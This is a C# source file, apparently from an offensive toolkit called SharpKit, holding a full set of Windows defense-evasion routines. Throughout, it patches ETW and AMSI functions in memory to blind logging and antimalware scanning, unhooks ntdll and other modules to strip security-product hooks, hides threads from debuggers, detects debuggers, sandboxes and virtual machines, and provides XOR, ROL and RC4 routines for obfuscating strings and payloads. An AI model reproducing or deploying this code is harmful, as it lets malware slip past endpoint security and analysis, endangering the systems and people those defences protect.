using System.Runtime.InteropServices;
using System.Text;

namespace SharpKit;

public static class Evasion
{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetModuleHandle(string moduleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateTimerQueueTimer(
        out IntPtr phNewTimer, IntPtr timerQueue,
        TimerCallback callback, IntPtr parameter,
        uint dueTime, uint period, uint flags);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeleteTimerQueueTimer(IntPtr timerQueue, IntPtr timer, IntPtr completionEvent);

    [DllImport("ntdll.dll")]
    private static extern int NtDelayExecution(bool alertable, ref long delayInterval);

    [DllImport("ntdll.dll")]
    private static extern int NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, ref uint threadInformation, uint threadInformationLength);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint ThreadHideFromDebugger = 17;

    public static bool PatchEtw()
    {
        var ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return false;

        var etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (etwEventWrite == IntPtr.Zero) return false;

        if (!VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, out var oldProtect))
            return false;

        Marshal.WriteByte(etwEventWrite, 0xC3);
        VirtualProtect(etwEventWrite, 1, oldProtect, out _);
        return true;
    }

    public static bool PatchEtwWrite()
    {
        var ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return false;

        var targets = new[] { "EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteEx", "EtwEventWriteString" };
        var patched = false;

        foreach (var target in targets)
        {
            var addr = GetProcAddress(ntdll, target);
            if (addr == IntPtr.Zero) continue;

            if (!VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, out var old)) continue;
            Marshal.WriteByte(addr, 0xC3);
            VirtualProtect(addr, 1, old, out _);
            patched = true;
        }

        return patched;
    }

    public static bool PatchAmsi()
    {
        var amsi = GetModuleHandle("amsi.dll");
        if (amsi == IntPtr.Zero)
            amsi = LoadLibrary("amsi.dll");
        if (amsi == IntPtr.Zero) return false;

        var scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        if (scanBuffer == IntPtr.Zero) return false;

        var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        if (!VirtualProtect(scanBuffer, (uint)patch.Length, PAGE_EXECUTE_READWRITE, out var oldProt))
            return false;

        Marshal.Copy(patch, 0, scanBuffer, patch.Length);
        VirtualProtect(scanBuffer, (uint)patch.Length, oldProt, out _);
        return true;
    }

    public static bool PatchAmsiScanString()
    {
        var amsi = GetModuleHandle("amsi.dll");
        if (amsi == IntPtr.Zero)
            amsi = LoadLibrary("amsi.dll");
        if (amsi == IntPtr.Zero) return false;

        var scanString = GetProcAddress(amsi, "AmsiScanString");
        if (scanString == IntPtr.Zero) return false;

        var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        if (!VirtualProtect(scanString, (uint)patch.Length, PAGE_EXECUTE_READWRITE, out var old))
            return false;

        Marshal.Copy(patch, 0, scanString, patch.Length);
        VirtualProtect(scanString, (uint)patch.Length, old, out _);
        return true;
    }

    public static bool UnhookNtdll()
    {
        var ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
        if (!File.Exists(ntdllPath)) return false;

        byte[] freshBytes;
        try { freshBytes = File.ReadAllBytes(ntdllPath); }
        catch { return false; }

        var ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return false;

        return OverwriteTextSection(ntdll, freshBytes);
    }

    public static bool UnhookModule(string moduleName)
    {
        var sysDir = Environment.SystemDirectory;
        var candidates = new[]
        {
            Path.Combine(sysDir, moduleName),
            Path.Combine(sysDir, moduleName + ".dll")
        };

        string? dllPath = null;
        foreach (var c in candidates)
            if (File.Exists(c)) { dllPath = c; break; }

        if (dllPath == null) return false;

        byte[] freshBytes;
        try { freshBytes = File.ReadAllBytes(dllPath); }
        catch { return false; }

        var hModule = GetModuleHandle(moduleName.Replace(".dll", ""));
        if (hModule == IntPtr.Zero)
            hModule = GetModuleHandle(moduleName);
        if (hModule == IntPtr.Zero) return false;

        return OverwriteTextSection(hModule, freshBytes);
    }

    private static unsafe bool OverwriteTextSection(IntPtr moduleBase, byte[] freshPeBytes)
    {
        try
        {
            var dosHeader = (byte*)moduleBase.ToPointer();
            if (dosHeader[0] != 0x4D || dosHeader[1] != 0x5A) return false;

            var e_lfanew = *(int*)(dosHeader + 0x3C);
            var ntHeaders = dosHeader + e_lfanew;
            var numSections = *(ushort*)(ntHeaders + 6);
            var optHeaderSize = *(ushort*)(ntHeaders + 20);
            var sectionStart = ntHeaders + 4 + 20 + optHeaderSize;

            for (int i = 0; i < numSections; i++)
            {
                var section = sectionStart + i * 40;
                var name = Encoding.ASCII.GetString(section, 8).TrimEnd('\0');
                if (name != ".text") continue;

                var virtualAddress = *(uint*)(section + 12);
                var rawSize = *(uint*)(section + 16);
                var rawOffset = *(uint*)(section + 20);

                if (rawOffset + rawSize > freshPeBytes.Length) return false;

                var target = moduleBase + (int)virtualAddress;

                if (!VirtualProtect(target, rawSize, PAGE_EXECUTE_READWRITE, out var old)) return false;
                Marshal.Copy(freshPeBytes, (int)rawOffset, target, (int)rawSize);
                VirtualProtect(target, rawSize, old, out _);
                return true;
            }

            return false;
        }
        catch { return false; }
    }

    public static bool HideThreadFromDebugger()
    {
        var hThread = GetCurrentThread();
        uint info = 0;
        return NtSetInformationThread(hThread, ThreadHideFromDebugger, ref info, 0) == 0;
    }

    public static void SleepObfuscated(int milliseconds)
    {
        var before = Environment.TickCount64;
        long delay = -10000L * milliseconds;
        NtDelayExecution(false, ref delay);
        var after = Environment.TickCount64;

        var elapsed = (int)(after - before);
        if (elapsed < milliseconds - 500)
        {
            var remaining = milliseconds - elapsed;
            delay = -10000L * remaining;
            NtDelayExecution(false, ref delay);
        }
    }

    public static bool IsBeingDebugged()
    {
        try
        {
            return System.Diagnostics.Debugger.IsAttached || CheckRemoteDebugger() || CheckHeapFlags();
        }
        catch { return false; }
    }

    private static bool CheckRemoteDebugger()
    {
        [DllImport("kernel32.dll")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool debuggerPresent);

        var present = false;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), ref present);
        return present;
    }

    private static unsafe bool CheckHeapFlags()
    {
        try
        {
            var peb = GetPebAddress();
            if (peb == IntPtr.Zero) return false;
            var ntGlobalFlags = *(uint*)((byte*)peb.ToPointer() + 0x68);
            return (ntGlobalFlags & 0x70) != 0;
        }
        catch { return false; }
    }

    private static IntPtr GetPebAddress()
    {
        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr hProcess, int infoClass, IntPtr info, uint size, out uint ret);

        var size = (uint)IntPtr.Size * 6;
        var buf = Marshal.AllocHGlobal((int)size);
        try
        {
            NtQueryInformationProcess(GetCurrentProcess(), 0, buf, size, out _);
            return Marshal.ReadIntPtr(buf, IntPtr.Size);
        }
        finally { Marshal.FreeHGlobal(buf); }
    }

    public static bool IsSandboxed()
    {
        var checks = new List<Func<bool>>
        {
            () => Environment.ProcessorCount < 2,
            () => Environment.SystemPageSize < 4096,
            () => CheckLowMemory(),
            () => CheckSandboxArtifacts(),
            () => CheckShortUptime()
        };

        return checks.Count(c => { try { return c(); } catch { return false; } }) >= 2;
    }

    private static bool CheckLowMemory()
    {
        [DllImport("kernel32.dll")]
        static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

        [StructLayout(LayoutKind.Sequential)]
        struct MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        var mem = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
        GlobalMemoryStatusEx(ref mem);
        return mem.ullTotalPhys < 2UL * 1024 * 1024 * 1024;
    }

    private static bool CheckSandboxArtifacts()
    {
        var suspiciousFiles = new[]
        {
            @"C:\analysis", @"C:\inetpub\wwwroot\upload",
            @"C:\windows\system32\drivers\vmmouse.sys",
            @"C:\windows\system32\drivers\vmhgfs.sys",
            @"C:\windows\system32\drivers\vboxmouse.sys"
        };
        return suspiciousFiles.Any(File.Exists);
    }

    private static bool CheckShortUptime()
    {
        return Environment.TickCount64 < 5 * 60 * 1000;
    }

    public static string ObfuscateString(string input)
    {
        var bytes = Encoding.UTF8.GetBytes(input);
        var key = (byte)(Environment.ProcessId & 0xFF);
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] ^= key;
        return Convert.ToBase64String(bytes);
    }

    public static string DeobfuscateString(string obfuscated)
    {
        var bytes = Convert.FromBase64String(obfuscated);
        var key = (byte)(Environment.ProcessId & 0xFF);
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] ^= key;
        return Encoding.UTF8.GetString(bytes);
    }

    public static byte[] XorEncrypt(byte[] data, byte[] key)
    {
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        return result;
    }

    public static byte[] RolEncrypt(byte[] data, int shift)
    {
        shift &= 7;
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)((data[i] << shift) | (data[i] >> (8 - shift)));
        return result;
    }

    public static byte[] RolDecrypt(byte[] data, int shift)
    {
        shift &= 7;
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)((data[i] >> shift) | (data[i] << (8 - shift)));
        return result;
    }

    public static byte[] Rc4(byte[] data, byte[] key)
    {
        var s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) & 0xFF;
            (s[i], s[j]) = (s[j], s[i]);
        }

        var result = new byte[data.Length];
        int x = 0, y = 0;
        for (int i = 0; i < data.Length; i++)
        {
            x = (x + 1) & 0xFF;
            y = (y + s[x]) & 0xFF;
            (s[x], s[y]) = (s[y], s[x]);
            result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 0xFF]);
        }

        return result;
    }
}
